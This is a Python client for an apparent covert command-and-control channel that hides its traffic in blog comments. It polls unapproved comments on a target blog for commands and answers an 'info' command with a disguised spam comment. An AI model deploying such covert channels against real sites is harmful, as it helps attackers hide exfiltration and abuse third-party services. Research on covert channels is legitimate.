#!/usr/bin/env python3
from wpc2 import *
import datetime
import random
import sys
import tools
import argparse

parser = argparse.ArgumentParser(description="Starts the client.")
parser.add_argument("id_number", type=int, help="ID number of this lient. Should be unique from other clients.")
parser.add_argument("-t", "--target", help="URL of target blog.", required=True)
parser.add_argument("-x", "--exfil_channel", help="Permalink of the exfil channel. Format: 2021/08/13/exfil-channel-post/.", required=True)
parser.add_argument("-a", "--ack_channel", help="Permalink of the acknowledgement channel. Format: 2021/08/13/ack-channel-post/.", required=True)
parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging.")
args = parser.parse_args()

tools.is_debug = args.verbose

client_id = args.id_number
random.seed(int(datetime.datetime.utcnow().timestamp()) + int(client_id))
sender = generate_random_sender()

channel = Channel()
channel.target_blog = args.target
channel.exfil_channel = args.exfil_channel
channel.ack_channel = args.ack_channel
channel.exfil_channel_id = get_post_id(channel.target_blog, channel.exfil_channel)
channel.ack_channel_id = get_post_id(channel.target_blog, channel.ack_channel)

mtb_recv_config = ReceiveConfig()
mtb_recv_config.recvr_id = client_id
mtb_recv_config.recv_time_slot = 5
mtb_recv_config.process_time_slot = 20
mtb_recv_config.prev_unapproved_index = 0

btm_send_config= SendConfig()
btm_send_config.sender_id = client_id
btm_send_config.send_time_slot = 25
btm_send_config.confirm_time_slot = 55

mtb_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)
while(True):
    log_print("[INFO] client: Waiting to receive data...", 1)
    received_data = receive_data(channel, 1, mtb_recv_config)
    mtb_recv_config.prev_unapproved_index = get_current_unapproved_index(channel)

    command_to_execute = None
    for command in received_data:
        command_to_execute = command.lower()

    if command_to_execute == "info":
        log_print("[INFO] client: Got info command. Sending data...", 1)
        comment = Comment()
        comment.sender = sender
        comment.comment_id = generate_random_string(10)
        comment.comment = generate_random_spam_comment() + "?d=" + comment.comment_id
        send_data(channel, comment, btm_send_config)
    else:
        log_print("[INFO] client: No command to execute.", 1)
